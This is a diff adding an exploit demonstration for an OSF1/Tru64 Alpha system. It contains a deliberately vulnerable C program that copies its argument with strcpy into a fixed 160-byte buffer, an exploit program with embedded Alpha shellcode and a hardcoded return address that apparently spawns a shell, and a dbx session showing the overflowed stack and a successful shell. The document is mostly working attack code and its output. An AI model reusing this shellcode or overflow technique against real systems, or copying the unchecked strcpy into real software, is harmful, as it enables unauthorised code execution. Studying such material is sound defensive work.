@@ -1,0 +1,76 @@
+#include<stdio.h>
+
+void aha(char *buf)
+{
+	char localbuf[160];
+	strcpy(localbuf,buf);
+}
+
+main(int argc,char **argv)
+{
+	aha(argv[1]);  
+}                                  
+
+----------------------------------------------------------------------------
+
+#include <stdio.h>
+#include <string.h>
+
+char evil_Taeho_code[]=
+          "\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42\xfc\xff\x32\xb2" 
+          "\x12\x94\x09\x42\xfc\xff\x32\xb2\xff\x47\x3f\x26\x1f\x04\x31\x22" 
+          "\xfc\xff\x30\xb2\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43" 
+          "\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43\x31\x15\xd8\x43" 
+          "\x12\x04\xff\x47\x40\xff\x1e\xb6\x48\xff\xfe\xb7\x98\xff\x7f\x26" 
+          "\xd0\x8c\x73\x22\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26" 
+          "\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43\x20\x35\x60\x42" 
+          "\xff\xff\xff\xff"   // end of real shellcode
+          "\xff\xff\xff\xff"   // for align
+          "\x78\xbf\xff\x1f";  // 0x00000001 1fffbf78 - ret addr
+                               // 0x00000001 part autopad.
+main()
+{
+
+int i,n; // if old c compiler :)
+
+char buf[180];  
+for (i = 0; i < 48; i++) buf[i] = '\x61';  
+for (n = 0; n < strlen(evil_Taeho_code); n++)  
+          buf[48+n] = evil_Taeho_code[n];
+execl("./aa","aaa",buf,NULL);
+}
+
+----------------------------------------------------------------------------
+osf1host> cc aa.c -o aa
+osf1host> cc expl.c -o expl
+osf1host> ./expl
+$ exit
+osf1host> dbx ./expl
+dbx version 5.1
+Type 'help' for help.
+
+(dbx) r
+
+Process 194979 now executing in file aa
+stopped at >*[main, 0x1200011a0]        lda     sp, -16(sp)
+(dbx) stopi at 0x300000501e0
+[2] stopi at 0x300000501e0
+(dbx) conti
+[2] stopped at >*[strcpy, 0x300000501e0]        call_pal bpt
+(dbx) print $sp
+4831821632
+(dbx) 4831821632/100x
+0x000000011fffbf40:  0x11b0 0x2000 0x0001 0x0000 0x6161 0x6161 0x6161 0x6161
+0x000000011fffbf50:  0x6161 0x6161 0x6161 0x6161 0x6161 0x6161 0x6161 0x6161
+0x000000011fffbf60:  0x6161 0x6161 0x6161 0x6161 0x6161 0x6161 0x6161 0x6161
+0x000000011fffbf70:  0x6161 0x6161 0x6161 0x6161 0x1530 0x43d9 0x7411 0x47f0
+0x000000011fffbf80:  0x1412 0x4202 0xfffc 0xb232 0x9412 0x4209 0xfffc 0xb232
+0x000000011fffbf90:  0x47ff 0x263f 0x041f 0x2231 0xfffc 0xb230 0xfff7 0xd21f
+0x000000011fffbfa0:  0x0410 0x47ff 0x1411 0x43e3 0x3520 0x4220 0xffff 0xffff
+0x000000011fffbfb0:  0x1530 0x43d9 0x1531 0x43d8 0x0412 0x47ff 0xff40 0xb61e
+0x000000011fffbfc0:  0xff48 0xb7fe 0xff98 0x267f 0x8cd0 0x2273 0x0513 0x47f3
+0x000000011fffbfd0:  0xff3c 0xb27e 0x6e69 0x267f 0x622f 0x2273 0xff38 0xb27e
+0x000000011fffbfe0:  0x9413 0x43e7 0x3520 0x4260 0xffff 0xffff 0xffff 0xffff
+0x000000011fffbff0:  0xbf78 0x1fff 0x0001 0x0000 0x0000 0x0000 0x0000 0x0000
+0x000000011fffc000:  0x0000 0x0000 0x0000 0x0000
+(dbx)
